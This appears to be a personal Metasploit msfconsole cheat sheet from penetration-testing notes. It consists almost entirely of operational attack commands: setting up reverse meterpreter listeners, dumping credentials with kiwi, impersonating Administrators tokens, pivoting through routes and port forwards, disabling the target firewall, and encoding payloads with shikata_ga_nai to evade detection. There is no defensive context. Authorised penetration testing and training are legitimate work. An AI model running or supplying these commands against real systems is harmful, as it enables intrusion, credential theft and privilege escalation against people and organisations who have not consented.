# MSFConsole
#### Start listener
```
use multi/handler
set payload windows/meterpreter/reverse_tcp
```

#### Background the sessions
```
Background
```

#### List sessions
```
sessions
```

#### Kill session
```
sessions -k <id>
```

#### Enter sessions
```
sessions -i <id>
```

#### Load kiwi module to dump creds and print help for kiwi
```
load kiwi
help kiwi
```

#### Load PowerShell and drop into shell
```
load powershell
powershell_shell
```

#### Set route
```
route add <subnet / host ip> <subnetmask> <session id>
```

#### Autoroute modulle
```
use multi/manage/autoroute
```

#### Create port forward
```
Portfwd add -l <LOCAL PORT> -p <REMOTE PORT> -r <REMOTE HOST>
```

#### After setting routes use bind shells

#### Metasploit imperssonate
```
Load incognito
list_tokens -g
impersonate_token "BUILTIN\Administrators"
```

## Autorun script
### Set solo module as autorunscript
```
set AutoRunScript windows/gather/enum_logged_on_users
set AutoRunScript post/windows/manage/migrate
```

#### Create a .rc file and use it like:
```
run post/windows/manage/migrate
run post/windows/manage/killfw
run post/windows/gather/checkvm
```

```
set AutoRunScript multi_console_command -rc /root/autoruncommands.rc
```

## Metasploit automation run automatic script
#### Create a .rc file
```
set PAYLOAD windows/meterpreter/reverse_https
set LHOST 10.11.0.4
set LPORT 443
set EnableStageEncoding true
set StageEncoder x86/shikata_ga_nai
set AutoRunScript post/windows/manage/migrate
set ExitOnSession false
exploit -j -z
```

#### Start metasploit with .rc file
```
sudo msfconsole -r setup.rc
```
